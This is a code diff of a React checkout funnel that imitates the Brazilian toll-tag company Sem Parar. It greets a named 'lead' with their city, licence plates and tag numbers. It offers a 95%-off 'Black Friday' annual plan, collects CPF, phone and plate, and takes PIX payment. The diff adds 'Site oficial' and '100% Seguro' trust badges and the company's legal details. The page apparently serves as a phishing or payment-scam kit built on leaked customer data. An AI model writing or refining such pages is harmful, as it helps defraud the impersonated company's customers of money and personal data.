@@ -10,8 +10,9 @@ import {
   Smartphone,
   Mail,
   ShieldCheck,
+  BadgeCheck,
   Check,
-  CircleCheckBig
+  ChevronRight
 } from 'lucide-react';
 
 interface LeadData {
@@ -111,358 +112,363 @@ export default function FunnelClient({ lead }: { lead: LeadData }) {
     return () => clearInterval(interval);
   }, [pixData?.id, paymentStatus]);
 
+  // Placa Mercosul Component
+  const PlacaMercosul = ({ placa }: { placa: string }) => (
+    <div className="flex-shrink-0">
+      <div className="bg-white rounded-[4px] overflow-hidden shadow-sm border border-[#d1d5db]" style={{ width: '88px' }}>
+        <div className="bg-[#003893] h-[14px] flex items-center justify-between px-1.5">
+          <div className="flex items-center gap-[2px]">
+            <div className="w-[5px] h-[5px] rounded-full bg-[#009739]"></div>
+            <div className="w-[5px] h-[5px] rounded-full bg-[#FEDD00]"></div>
+          </div>
+          <span className="text-white text-[5px] font-semibold tracking-wide">BRASIL</span>
+          <div className="bg-[#009739] rounded-[2px] px-[3px] py-[1px]">
+            <span className="text-white text-[4px] font-bold">BR</span>
+          </div>
+        </div>
+        <div className="bg-white py-[6px]">
+          <p className="text-[#1a1a1a] text-[13px] font-bold font-mono text-center tracking-[0.08em]">
+            {placa}
+          </p>
+        </div>
+      </div>
+    </div>
+  );
+
+  // TAG Sem Parar Component
+  const TagSemParar = ({ numero }: { numero: string }) => (
+    <div className="flex-shrink-0">
+      <div className="bg-white rounded-[4px] overflow-hidden shadow-sm border border-[#d1d5db]" style={{ width: '88px' }}>
+        <div className="bg-gradient-to-r from-[#FFD000] to-[#FFBA00] h-[14px] flex items-center justify-center gap-1">
+          <div className="w-[4px] h-[4px] rounded-full bg-[#d60b52]"></div>
+          <span className="text-[#1a1a1a] text-[5px] font-bold tracking-wide">SEM PARAR</span>
+        </div>
+        <div className="bg-white py-[6px]">
+          <p className="text-[#1a1a1a] text-[10px] font-semibold font-mono text-center tracking-wide">
+            {numero}
+          </p>
+        </div>
+      </div>
+    </div>
+  );
+
   return (
-    <div className="min-h-screen bg-white flex flex-col">
+    <div className="min-h-screen bg-[#fafafa] flex flex-col">
       {/* Header */}
-      <header className="border-b border-[#e6e6e6]">
-        <div className="max-w-[1200px] mx-auto px-4 sm:px-6 py-4 flex items-center justify-between">
-          <Image src="/logo.png" alt="Sem Parar" width={120} height={32} className="h-8 w-auto" />
-          <div className="hidden sm:flex items-center gap-6 text-sm text-[#0e0d0d]">
-            <span>Para voce</span>
-            <span>Para empresas</span>
+      <header className="bg-white border-b border-[#e5e7eb] sticky top-0 z-50">
+        <div className="max-w-3xl mx-auto px-4 sm:px-6 py-4 flex items-center justify-between">
+          <Image src="/logo.png" alt="Sem Parar" width={110} height={30} className="h-7 w-auto" />
+          <div className="hidden sm:flex items-center gap-1 text-[13px] text-[#6b7280]">
+            <ShieldCheck className="w-4 h-4 text-[#10b981]" strokeWidth={2} />
+            <span>Site oficial</span>
           </div>
         </div>
       </header>
 
       {/* PAGINA DA OFERTA */}
       {step === 'offer' && (
-        <main className="flex-1 max-w-[800px] mx-auto px-4 py-8 sm:py-12 w-full">
-          {/* Badge */}
-          <div className="text-center mb-6">
-            <span className="inline-block bg-[#d60b52] text-white text-xs font-semibold px-4 py-1.5 rounded-full">
-              OFERTA EXCLUSIVA
-            </span>
-          </div>
+        <main className="flex-1 w-full">
+          <div className="max-w-2xl mx-auto px-4 sm:px-6 py-8 sm:py-12">
 
-          {/* Titulo */}
-          <div className="text-center mb-6">
-            <h1 className="text-[#0e0d0d] text-2xl sm:text-[32px] font-bold leading-tight mb-4">
-              {lead.firstName}, voce foi selecionado!
-            </h1>
-
-            {/* Preco destaque */}
-            <div className="mb-2">
-              <span className="text-[#d60b52] text-5xl sm:text-6xl font-bold">
-                R$ {promoPrice.toFixed(2).replace('.', ',')}
+            {/* Badge */}
+            <div className="text-center mb-6">
+              <span className="inline-flex items-center gap-1.5 bg-[#d60b52] text-white text-[11px] font-semibold px-4 py-2 rounded-full shadow-sm">
+                <span className="w-1.5 h-1.5 bg-white rounded-full animate-pulse"></span>
+                OFERTA EXCLUSIVA
               </span>
             </div>
-            <p className="text-[#0e0d0d] text-lg font-medium mb-1">pelo ano inteiro</p>
-            <p className="text-[#666] text-sm">
-              De R$ {mensalidadeAtual.toFixed(2).replace('.', ',')}/mes • 95% de Economia
-            </p>
-          </div>
 
-          {/* Card com dados do cliente */}
-          <div className="bg-[#f8f8f8] rounded-xl p-5 mb-6">
-            <div className="flex items-center gap-3 mb-4 pb-4 border-b border-[#e6e6e6]">
-              <div className="w-12 h-12 bg-[#d60b52] rounded-full flex items-center justify-center text-white text-xl font-bold">
-                {lead.firstName.charAt(0)}
+            {/* Titulo */}
+            <div className="text-center mb-10">
+              <h1 className="text-[#111827] text-[26px] sm:text-[32px] font-bold leading-tight mb-5">
+                {lead.firstName}, voce foi selecionado!
+              </h1>
+
+              {/* Preco */}
+              <div className="inline-flex flex-col items-center bg-white rounded-2xl px-8 py-6 shadow-sm border border-[#e5e7eb]">
+                <span className="text-[#d60b52] text-[48px] sm:text-[56px] font-bold leading-none">
+                  R$ {promoPrice.toFixed(2).replace('.', ',')}
+                </span>
+                <span className="text-[#374151] text-base font-medium mt-1">pelo ano inteiro</span>
+                <div className="flex items-center gap-2 mt-3">
+                  <span className="text-[#9ca3af] text-sm line-through">R$ {mensalidadeAtual.toFixed(2).replace('.', ',')}/mes</span>
+                  <span className="bg-[#dcfce7] text-[#166534] text-xs font-semibold px-2 py-0.5 rounded-full">95% OFF</span>
+                </div>
               </div>
-              <div>
-                <p className="text-[#0e0d0d] font-semibold">{lead.nome}</p>
-                <p className="text-[#666] text-sm">{lead.cidade}/{lead.estado}</p>
-              </div>
-              <div className="ml-auto">
-                <span className="inline-block bg-[#dcfce7] text-[#166534] text-xs font-medium px-2 py-1 rounded-full">
-                  Cliente Sem Parar
+            </div>
+
+            {/* Card do Cliente */}
+            <div className="bg-white rounded-2xl border border-[#e5e7eb] shadow-sm overflow-hidden mb-8">
+              {/* Header do card */}
+              <div className="px-5 py-4 border-b border-[#f3f4f6] flex items-center gap-4">
+                <div className="w-11 h-11 bg-gradient-to-br from-[#d60b52] to-[#a50840] rounded-full flex items-center justify-center text-white text-lg font-semibold shadow-sm">
+                  {lead.firstName.charAt(0)}
+                </div>
+                <div className="flex-1 min-w-0">
+                  <p className="text-[#111827] font-semibold text-[15px] truncate">{lead.nome}</p>
+                  <p className="text-[#6b7280] text-[13px]">{lead.cidade}/{lead.estado}</p>
+                </div>
+                <span className="inline-flex items-center gap-1 bg-[#f0fdf4] text-[#166534] text-[11px] font-medium px-2.5 py-1 rounded-full border border-[#bbf7d0]">
+                  <BadgeCheck className="w-3.5 h-3.5" strokeWidth={2} />
+                  Cliente ativo
                 </span>
               </div>
-            </div>
 
-            {/* Veiculos e TAGs */}
-            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 mb-4">
-              {/* Placas Mercosul */}
-              <div>
-                <p className="text-[#666] text-xs mb-2 text-center">{lead.qtdVeiculos} Veiculo{lead.qtdVeiculos !== 1 ? 's' : ''} Cadastrado{lead.qtdVeiculos !== 1 ? 's' : ''}</p>
-                <div className="flex flex-wrap gap-2 justify-center">
-                  {lead.placas.slice(0, 3).map((placa, i) => (
-                    <div key={i} className="relative">
-                      {/* Placa Mercosul */}
-                      <div className="bg-white rounded-md overflow-hidden shadow-sm border border-[#ccc]" style={{ width: '90px' }}>
-                        {/* Faixa azul superior */}
-                        <div className="bg-[#003399] h-4 flex items-center justify-between px-1">
-                          <div className="flex items-center gap-0.5">
-                            <div className="w-2 h-2 rounded-full bg-[#009c3b]"></div>
-                            <div className="w-2 h-2 rounded-full bg-[#ffdf00]"></div>
-                          </div>
-                          <span className="text-white text-[6px] font-bold">BRASIL</span>
-                          <div className="w-3 h-2 bg-[#009c3b] rounded-sm flex items-center justify-center">
-                            <span className="text-white text-[5px]">BR</span>
-                          </div>
-                        </div>
-                        {/* Numero da placa */}
-                        <div className="bg-white py-1.5 px-1">
-                          <p className="text-[#0e0d0d] text-sm font-bold font-mono text-center tracking-wider">
-                            {placa}
-                          </p>
-                        </div>
-                      </div>
+              {/* Placas e TAGs */}
+              <div className="p-5">
+                <div className="grid grid-cols-1 sm:grid-cols-2 gap-6">
+                  {/* Placas */}
+                  <div>
+                    <p className="text-[#6b7280] text-[11px] font-medium uppercase tracking-wider mb-3">
+                      {lead.placas.length} Veiculo{lead.placas.length !== 1 ? 's' : ''} cadastrado{lead.placas.length !== 1 ? 's' : ''}
+                    </p>
+                    <div className="flex flex-wrap gap-2">
+                      {lead.placas.slice(0, 3).map((placa, i) => (
+                        <PlacaMercosul key={i} placa={placa} />
+                      ))}
+                      {lead.placas.length > 3 && (
+                        <span className="text-[#9ca3af] text-xs self-center">+{lead.placas.length - 3}</span>
+                      )}
                     </div>
-                  ))}
-                  {lead.placas.length > 3 && (
-                    <div className="flex items-center text-[#666] text-xs">+{lead.placas.length - 3}</div>
-                  )}
-                </div>
-              </div>
+                  </div>
 
-              {/* TAGs Sem Parar */}
-              <div>
-                <p className="text-[#666] text-xs mb-2 text-center">{lead.tags.length} TAG{lead.tags.length !== 1 ? 's' : ''} Ativa{lead.tags.length !== 1 ? 's' : ''}</p>
-                <div className="flex flex-wrap gap-2 justify-center">
-                  {lead.tags.slice(0, 3).map((tag, i) => (
-                    <div key={i} className="bg-white rounded-md overflow-hidden shadow-sm border border-[#e6e6e6]" style={{ width: '90px' }}>
-                      {/* Header amarelo */}
-                      <div className="bg-gradient-to-r from-[#FFD100] to-[#FFC000] px-2 py-1 flex items-center justify-center gap-1">
-                        <div className="w-1.5 h-1.5 bg-[#d60b52] rounded-full"></div>
-                        <span className="text-[#0e0d0d] text-[7px] font-bold">SEM PARAR</span>
-                      </div>
-                      {/* Numero da TAG */}
-                      <div className="bg-white py-1.5 px-1">
-                        <p className="text-[#0e0d0d] text-[10px] font-mono text-center tracking-tight">
-                          {tag}
-                        </p>
-                      </div>
+                  {/* TAGs */}
+                  <div>
+                    <p className="text-[#6b7280] text-[11px] font-medium uppercase tracking-wider mb-3">
+                      {lead.tags.length} TAG{lead.tags.length !== 1 ? 's' : ''} ativa{lead.tags.length !== 1 ? 's' : ''}
+                    </p>
+                    <div className="flex flex-wrap gap-2">
+                      {lead.tags.slice(0, 3).map((tag, i) => (
+                        <TagSemParar key={i} numero={tag} />
+                      ))}
+                      {lead.tags.length > 3 && (
+                        <span className="text-[#9ca3af] text-xs self-center">+{lead.tags.length - 3}</span>
+                      )}
                     </div>
-                  ))}
-                  {lead.tags.length > 3 && (
-                    <div className="flex items-center text-[#666] text-xs">+{lead.tags.length - 3}</div>
-                  )}
+                  </div>
                 </div>
               </div>
             </div>
-          </div>
 
-          {/* Beneficios Grid */}
-          <div className="grid grid-cols-2 sm:grid-cols-4 gap-4 mb-6">
-            <div className="bg-white border border-[#e6e6e6] rounded-xl p-4 text-center">
-              <div className="text-[#d60b52] flex justify-center mb-2">
-                <Car className="w-8 h-8" strokeWidth={1.5} />
-              </div>
-              <p className="text-[#0e0d0d] text-xs font-semibold">1 Ano Sem</p>
-              <p className="text-[#0e0d0d] text-xs font-semibold">Pedagio</p>
+            {/* Beneficios */}
+            <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 mb-8">
+              {[
+                { Icon: Car, line1: '1 Ano Sem', line2: 'Pedagio', color: '#d60b52' },
+                { Icon: ParkingCircle, line1: '1 Ano Sem', line2: 'Estacionamento', color: '#d60b52' },
+                { Icon: null, line1: '30% OFF', line2: "McDonald's", color: null, isMcDonalds: true },
+                { Icon: Fuel, line1: '-R$ 0,20', line2: '/Litro', color: '#d60b52' },
+              ].map((item, i) => (
+                <div key={i} className="bg-white rounded-xl p-4 border border-[#e5e7eb] text-center hover:border-[#d60b52]/30 hover:shadow-sm transition-all">
+                  <div className="flex justify-center mb-2.5 h-8 items-center">
+                    {item.isMcDonalds ? (
+                      <Image src="/mcdonalds.svg" alt="McDonald's" width={28} height={28} className="h-7 w-auto" />
+                    ) : item.Icon && (
+                      <item.Icon className="w-7 h-7" style={{ color: item.color }} strokeWidth={1.5} />
+                    )}
+                  </div>
+                  <p className="text-[#111827] text-[13px] font-semibold leading-tight">{item.line1}</p>
+                  <p className="text-[#111827] text-[13px] font-semibold leading-tight">{item.line2}</p>
+                </div>
+              ))}
             </div>
-            <div className="bg-white border border-[#e6e6e6] rounded-xl p-4 text-center">
-              <div className="text-[#d60b52] flex justify-center mb-2">
-                <ParkingCircle className="w-8 h-8" strokeWidth={1.5} />
-              </div>
-              <p className="text-[#0e0d0d] text-xs font-semibold">1 Ano Sem</p>
-              <p className="text-[#0e0d0d] text-xs font-semibold">Estacionamento</p>
-            </div>
-            <div className="bg-white border border-[#e6e6e6] rounded-xl p-4 text-center">
-              <div className="flex justify-center mb-2">
-                <Image src="/mcdonalds.svg" alt="McDonald's" width={32} height={32} className="h-8 w-auto" />
-              </div>
-              <p className="text-[#0e0d0d] text-xs font-semibold">30% OFF</p>
-              <p className="text-[#0e0d0d] text-xs font-semibold">McDonald's</p>
-            </div>
-            <div className="bg-white border border-[#e6e6e6] rounded-xl p-4 text-center">
-              <div className="text-[#d60b52] flex justify-center mb-2">
-                <Fuel className="w-8 h-8" strokeWidth={1.5} />
-              </div>
-              <p className="text-[#0e0d0d] text-xs font-semibold">-R$ 0,20</p>
-              <p className="text-[#0e0d0d] text-xs font-semibold">/Litro</p>
-            </div>
-          </div>
 
-          {/* Info adicional */}
-          <div className="flex items-center justify-center gap-6 mb-6 text-sm text-[#666]">
-            <span className="flex items-center gap-1.5">
-              <Check className="w-4 h-4 text-[#16a34a]" strokeWidth={2.5} /> Sem fidelidade
-            </span>
-            <span className="flex items-center gap-1.5">
-              <Check className="w-4 h-4 text-[#16a34a]" strokeWidth={2.5} /> Cancele quando quiser
-            </span>
-          </div>
+            {/* Trust badges */}
+            <div className="flex items-center justify-center gap-6 mb-8">
+              <span className="flex items-center gap-1.5 text-[#6b7280] text-[13px]">
+                <Check className="w-4 h-4 text-[#10b981]" strokeWidth={2.5} />
+                Sem fidelidade
+              </span>
+              <span className="flex items-center gap-1.5 text-[#6b7280] text-[13px]">
+                <Check className="w-4 h-4 text-[#10b981]" strokeWidth={2.5} />
+                Cancele quando quiser
+              </span>
+            </div>
 
-          {/* CTA */}
-          <button
-            onClick={() => setStep('checkout')}
-            className="w-full bg-[#d60b52] hover:bg-[#b20944] text-white font-semibold text-base py-4 rounded-xl transition-colors"
-          >
-            Quero aproveitar esta oferta
-          </button>
+            {/* CTA */}
+            <button
+              onClick={() => setStep('checkout')}
+              className="w-full bg-[#d60b52] hover:bg-[#b8094a] active:bg-[#9a0840] text-white font-semibold text-base py-4 rounded-xl transition-all shadow-sm hover:shadow-md flex items-center justify-center gap-2"
+            >
+              Quero aproveitar esta oferta
+              <ChevronRight className="w-5 h-5" strokeWidth={2} />
+            </button>
+          </div>
         </main>
       )}
 
-      {/* CHECKOUT / PAGAMENTO */}
+      {/* CHECKOUT */}
       {step === 'checkout' && (
-        <main className="flex-1 max-w-[800px] mx-auto px-4 py-8 sm:py-12 w-full">
-          {/* Titulo */}
-          <div className="text-center mb-8">
-            <h1 className="text-[#0e0d0d] text-2xl sm:text-[32px] font-bold leading-tight mb-3">
-              Finalize seu Sem Parar Black Friday
-            </h1>
-          </div>
+        <main className="flex-1 w-full">
+          <div className="max-w-lg mx-auto px-4 sm:px-6 py-8 sm:py-12">
 
-          {/* Resumo do plano */}
-          <div className="bg-white border border-[#e6e6e6] rounded-xl p-6 mb-6">
-            <div className="flex items-center justify-between">
+            {/* Titulo */}
+            <div className="text-center mb-8">
+              <h1 className="text-[#111827] text-[22px] sm:text-[26px] font-bold leading-tight">
+                Finalize sua assinatura
+              </h1>
+              <p className="text-[#6b7280] text-[15px] mt-2">Black Friday Sem Parar</p>
+            </div>
+
+            {/* Resumo */}
+            <div className="bg-white rounded-xl border border-[#e5e7eb] p-5 mb-6">
+              <div className="flex items-center justify-between">
+                <div>
+                  <p className="text-[#111827] font-semibold text-[15px]">Plano Anual</p>
+                  <p className="text-[#6b7280] text-[13px]">+ 4 Beneficios Black Friday</p>
+                </div>
+                <p className="text-[#d60b52] text-2xl font-bold">R$ {promoPrice.toFixed(2).replace('.', ',')}</p>
+              </div>
+            </div>
+
+            {/* Formulario */}
+            <div className="bg-white rounded-xl border border-[#e5e7eb] p-5 mb-6 space-y-5">
               <div>
-                <p className="text-[#0e0d0d] font-semibold">Plano Anual +</p>
-                <p className="text-[#666] text-sm">4 Beneficios Black Friday</p>
+                <label className="block text-[#374151] text-[13px] font-medium mb-2">Dados Pessoais</label>
+                <div className="grid grid-cols-2 gap-3">
+                  <input
+                    type="text"
+                    value={formData.cpf}
+                    onChange={(e) => setFormData({ ...formData, cpf: e.target.value })}
+                    className="w-full border border-[#d1d5db] rounded-lg px-4 py-3 text-[#111827] text-[15px] focus:outline-none focus:ring-2 focus:ring-[#d60b52]/20 focus:border-[#d60b52] transition-all"
+                    placeholder="CPF"
+                  />
+                  <input
+                    type="text"
+                    value={formData.telefone}
+                    onChange={(e) => setFormData({ ...formData, telefone: e.target.value })}
+                    className="w-full border border-[#d1d5db] rounded-lg px-4 py-3 text-[#111827] text-[15px] focus:outline-none focus:ring-2 focus:ring-[#d60b52]/20 focus:border-[#d60b52] transition-all"
+                    placeholder="Telefone"
+                  />
+                </div>
               </div>
-              <p className="text-[#d60b52] text-2xl font-bold">R$ {promoPrice.toFixed(2).replace('.', ',')}</p>
-            </div>
-          </div>
 
-          {/* Formulario */}
-          <div className="bg-white border border-[#e6e6e6] rounded-xl p-6 mb-6">
-            {/* Dados Pessoais */}
-            <div className="mb-6">
-              <p className="text-[#0e0d0d] text-sm font-semibold mb-3">Dados Pessoais</p>
-              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
+              <div>
+                <label className="block text-[#374151] text-[13px] font-medium mb-2">Dados do Veiculo</label>
                 <input
                   type="text"
-                  value={formData.cpf}
-                  onChange={(e) => setFormData({ ...formData, cpf: e.target.value })}
-                  className="w-full border border-[#e6e6e6] rounded-lg px-4 py-3 text-[#0e0d0d] focus:outline-none focus:border-[#d60b52]"
-                  placeholder="CPF"
-                />
-                <input
-                  type="text"
-                  value={formData.telefone}
-                  onChange={(e) => setFormData({ ...formData, telefone: e.target.value })}
-                  className="w-full border border-[#e6e6e6] rounded-lg px-4 py-3 text-[#0e0d0d] focus:outline-none focus:border-[#d60b52]"
-                  placeholder="Telefone"
+                  value={formData.placa}
+                  onChange={(e) => setFormData({ ...formData, placa: e.target.value })}
+                  className="w-full border border-[#d1d5db] rounded-lg px-4 py-3 text-[#111827] text-[15px] focus:outline-none focus:ring-2 focus:ring-[#d60b52]/20 focus:border-[#d60b52] transition-all"
+                  placeholder="Placa"
                 />
               </div>
-            </div>
 
-            {/* Dados do Veiculo */}
-            <div className="mb-6">
-              <p className="text-[#0e0d0d] text-sm font-semibold mb-3">Dados do Veiculo</p>
-              <input
-                type="text"
-                value={formData.placa}
-                onChange={(e) => setFormData({ ...formData, placa: e.target.value })}
-                className="w-full border border-[#e6e6e6] rounded-lg px-4 py-3 text-[#0e0d0d] focus:outline-none focus:border-[#d60b52]"
-                placeholder="Placa"
-              />
-            </div>
-
-            {/* Forma de Pagamento */}
-            <div>
-              <p className="text-[#0e0d0d] text-sm font-semibold mb-3">Forma de Pagamento</p>
-              <select
-                value={formData.paymentMethod}
-                onChange={(e) => setFormData({ ...formData, paymentMethod: e.target.value })}
-                className="w-full border border-[#e6e6e6] rounded-lg px-4 py-3 text-[#0e0d0d] focus:outline-none focus:border-[#d60b52] bg-white"
-              >
-                <option value="pix">Pix</option>
-                <option value="cartao">Cartao</option>
-              </select>
-            </div>
-          </div>
-
-          {/* QR Code PIX */}
-          {pixData && (
-            <div className="bg-white border border-[#e6e6e6] rounded-xl p-6 mb-6 text-center">
-              <p className="text-[#0e0d0d] font-semibold mb-4">Escaneie o QR Code ou copie o codigo</p>
-              {pixData.qrCodeBase64 && (
-                <img src={`data:image/png;base64,${pixData.qrCodeBase64}`} alt="QR Code" className="w-48 h-48 mx-auto mb-4" />
-              )}
-              <div className="flex gap-3 max-w-md mx-auto">
-                <code className="flex-1 text-[#0e0d0d] text-xs bg-[#f8f8f8] border border-[#e6e6e6] rounded-lg p-3 text-left truncate">
-                  {pixData.copyPaste}
-                </code>
-                <button
-                  onClick={handleCopyPix}
-                  className="bg-[#0e0d0d] hover:bg-[#333] text-white font-semibold px-4 py-2 rounded-lg transition-colors"
+              <div>
+                <label className="block text-[#374151] text-[13px] font-medium mb-2">Forma de Pagamento</label>
+                <select
+                  value={formData.paymentMethod}
+                  onChange={(e) => setFormData({ ...formData, paymentMethod: e.target.value })}
+                  className="w-full border border-[#d1d5db] rounded-lg px-4 py-3 text-[#111827] text-[15px] focus:outline-none focus:ring-2 focus:ring-[#d60b52]/20 focus:border-[#d60b52] bg-white transition-all"
                 >
-                  {copied ? 'Copiado!' : 'Copiar'}
-                </button>
+                  <option value="pix">PIX</option>
+                  <option value="cartao">Cartao de Credito</option>
+                </select>
               </div>
-              <p className="text-[#666] text-sm mt-4 flex items-center justify-center gap-2">
-                <span className="w-2 h-2 bg-[#fbbf24] rounded-full animate-pulse"></span>
-                Aguardando pagamento...
+            </div>
+
+            {/* QR Code PIX */}
+            {pixData && (
+              <div className="bg-white rounded-xl border border-[#e5e7eb] p-6 mb-6 text-center">
+                <p className="text-[#111827] font-semibold text-[15px] mb-4">Escaneie o QR Code</p>
+                {pixData.qrCodeBase64 && (
+                  <div className="bg-[#f9fafb] rounded-xl p-4 inline-block mb-4">
+                    <img src={`data:image/png;base64,${pixData.qrCodeBase64}`} alt="QR Code" className="w-44 h-44" />
+                  </div>
+                )}
+                <div className="flex gap-2 max-w-sm mx-auto">
+                  <code className="flex-1 text-[#374151] text-xs bg-[#f9fafb] border border-[#e5e7eb] rounded-lg p-3 text-left truncate font-mono">
+                    {pixData.copyPaste}
+                  </code>
+                  <button
+                    onClick={handleCopyPix}
+                    className="bg-[#111827] hover:bg-[#1f2937] text-white font-medium text-sm px-4 py-2 rounded-lg transition-colors"
+                  >
+                    {copied ? 'Copiado!' : 'Copiar'}
+                  </button>
+                </div>
+                <p className="text-[#6b7280] text-sm mt-4 flex items-center justify-center gap-2">
+                  <span className="w-2 h-2 bg-[#f59e0b] rounded-full animate-pulse"></span>
+                  Aguardando pagamento...
+                </p>
+              </div>
+            )}
+
+            {/* Trust badges */}
+            <div className="flex items-center justify-center gap-6 mb-6">
+              <span className="flex items-center gap-1.5 text-[#6b7280] text-[13px]">
+                <ShieldCheck className="w-4 h-4 text-[#10b981]" strokeWidth={2} />
+                100% Seguro
+              </span>
+              <span className="flex items-center gap-1.5 text-[#6b7280] text-[13px]">
+                <BadgeCheck className="w-4 h-4 text-[#d60b52]" strokeWidth={2} />
+                Sem Parar Oficial
+              </span>
+            </div>
+
+            {/* CTA */}
+            <button
+              onClick={handleConfirm}
+              disabled={loading || !formData.cpf}
+              className="w-full bg-[#d60b52] hover:bg-[#b8094a] active:bg-[#9a0840] text-white font-semibold text-base py-4 rounded-xl transition-all shadow-sm hover:shadow-md disabled:opacity-50 disabled:cursor-not-allowed disabled:hover:shadow-sm"
+            >
+              {loading ? 'Processando...' : `Confirmar e Pagar R$ ${promoPrice.toFixed(2).replace('.', ',')}`}
+            </button>
+
+            <button
+              onClick={() => setStep('offer')}
+              className="w-full text-[#6b7280] hover:text-[#374151] text-sm font-medium py-3 mt-2 transition-colors"
+            >
+              ← Voltar para a oferta
+            </button>
+          </div>
+        </main>
+      )}
+
+      {/* SUCESSO */}
+      {step === 'success' && (
+        <main className="flex-1 w-full">
+          <div className="max-w-lg mx-auto px-4 sm:px-6 py-12 sm:py-16">
+
+            {/* Check */}
+            <div className="text-center mb-10">
+              <div className="w-20 h-20 bg-[#dcfce7] rounded-full flex items-center justify-center mx-auto mb-6 shadow-sm">
+                <Check className="w-10 h-10 text-[#16a34a]" strokeWidth={3} />
+              </div>
+              <h1 className="text-[#111827] text-[26px] sm:text-[32px] font-bold mb-2">
+                Assinatura confirmada!
+              </h1>
+              <p className="text-[#6b7280] text-base">
+                Seus beneficios Black Friday ja estao ativos
               </p>
             </div>
-          )}
 
-          {/* Selos de seguranca */}
-          <div className="flex items-center justify-center gap-8 mb-6">
-            <div className="flex items-center gap-2 text-[#666] text-sm">
-              <ShieldCheck className="w-5 h-5 text-[#16a34a]" strokeWidth={1.5} />
-              <span>Ambiente 100% Seguro</span>
-            </div>
-            <div className="flex items-center gap-2 text-[#666] text-sm">
-              <CircleCheckBig className="w-5 h-5 text-[#d60b52]" strokeWidth={1.5} />
-              <span>Sem Parar Oficial</span>
-            </div>
-          </div>
-
-          {/* CTA */}
-          <button
-            onClick={handleConfirm}
-            disabled={loading || !formData.cpf}
-            className="w-full bg-[#d60b52] hover:bg-[#b20944] text-white font-semibold text-base py-4 rounded-xl transition-colors disabled:opacity-50 disabled:cursor-not-allowed mb-4"
-          >
-            {loading ? 'Processando...' : `Confirmar e Pagar R$ ${promoPrice.toFixed(2).replace('.', ',')}`}
-          </button>
-
-          <button
-            onClick={() => setStep('offer')}
-            className="w-full text-[#666] text-sm py-2 hover:text-[#0e0d0d] transition-colors"
-          >
-            ← Voltar
-          </button>
-        </main>
-      )}
-
-      {/* CONFIRMACAO & ATIVACAO */}
-      {step === 'success' && (
-        <main className="flex-1 max-w-[800px] mx-auto px-4 py-10 sm:py-16 w-full">
-          {/* Check icon */}
-          <div className="text-center mb-8">
-            <div className="w-20 h-20 bg-[#dcfce7] rounded-full flex items-center justify-center mx-auto mb-6">
-              <Check className="w-10 h-10 text-[#16a34a]" strokeWidth={3} />
-            </div>
-            <h1 className="text-[#0e0d0d] text-2xl sm:text-[32px] font-bold mb-2">
-              Assinatura Confirmada!
-            </h1>
-            <p className="text-[#666] text-lg">
-              Beneficios Black Friday Ativos
-            </p>
-          </div>
-
-          {/* Proximos passos */}
-          <div className="max-w-md mx-auto space-y-4">
-            <div className="flex items-center gap-4 bg-[#f8f8f8] rounded-xl p-5">
-              <div className="w-12 h-12 bg-white rounded-full flex items-center justify-center text-[#d60b52] shadow-sm">
-                <Package className="w-6 h-6" strokeWidth={1.5} />
-              </div>
-              <div>
-                <p className="text-[#0e0d0d] font-semibold">Envio da TAG para seu endereco</p>
-                <p className="text-[#666] text-sm">Chegara em ate 7 dias uteis</p>
-              </div>
-            </div>
-            <div className="flex items-center gap-4 bg-[#f8f8f8] rounded-xl p-5">
-              <div className="w-12 h-12 bg-white rounded-full flex items-center justify-center text-[#d60b52] shadow-sm">
-                <Smartphone className="w-6 h-6" strokeWidth={1.5} />
-              </div>
-              <div>
-                <p className="text-[#0e0d0d] font-semibold">Acesso imediato no App Sem Parar</p>
-                <p className="text-[#666] text-sm">Baixe na App Store ou Google Play</p>
-              </div>
-            </div>
-            <div className="flex items-center gap-4 bg-[#f8f8f8] rounded-xl p-5">
-              <div className="w-12 h-12 bg-white rounded-full flex items-center justify-center text-[#d60b52] shadow-sm">
-                <Mail className="w-6 h-6" strokeWidth={1.5} />
-              </div>
-              <div>
-                <p className="text-[#0e0d0d] font-semibold">Comprovante enviado por E-mail</p>
-                <p className="text-[#666] text-sm">Verifique sua caixa de entrada</p>
-              </div>
+            {/* Proximos passos */}
+            <div className="space-y-3">
+              {[
+                { Icon: Package, title: 'Envio da TAG', desc: 'Chegara em ate 7 dias uteis' },
+                { Icon: Smartphone, title: 'Acesse o App', desc: 'Use seus beneficios agora' },
+                { Icon: Mail, title: 'E-mail enviado', desc: 'Confira sua caixa de entrada' },
+              ].map((item, i) => (
+                <div key={i} className="bg-white rounded-xl border border-[#e5e7eb] p-4 flex items-center gap-4">
+                  <div className="w-11 h-11 bg-[#fdf2f4] rounded-full flex items-center justify-center flex-shrink-0">
+                    <item.Icon className="w-5 h-5 text-[#d60b52]" strokeWidth={1.5} />
+                  </div>
+                  <div>
+                    <p className="text-[#111827] font-semibold text-[15px]">{item.title}</p>
+                    <p className="text-[#6b7280] text-[13px]">{item.desc}</p>
+                  </div>
+                </div>
+              ))}
             </div>
           </div>
         </main>
       )}
 
       {/* Footer */}
-      <footer className="border-t border-[#e6e6e6] mt-auto">
-        <div className="max-w-[800px] mx-auto px-4 py-6 text-center">
-          <Image src="/logo.png" alt="Sem Parar" width={80} height={24} className="h-6 w-auto mx-auto mb-4 opacity-50" />
-          <p className="text-[#999] text-xs">
+      <footer className="bg-white border-t border-[#e5e7eb] mt-auto">
+        <div className="max-w-3xl mx-auto px-4 sm:px-6 py-6 text-center">
+          <Image src="/logo.png" alt="Sem Parar" width={72} height={20} className="h-5 w-auto mx-auto mb-3 opacity-40" />
+          <p className="text-[#9ca3af] text-[11px]">
             DBTrans Internet Ltda. · CNPJ 10.558.633/0001-61
           </p>
         </div>
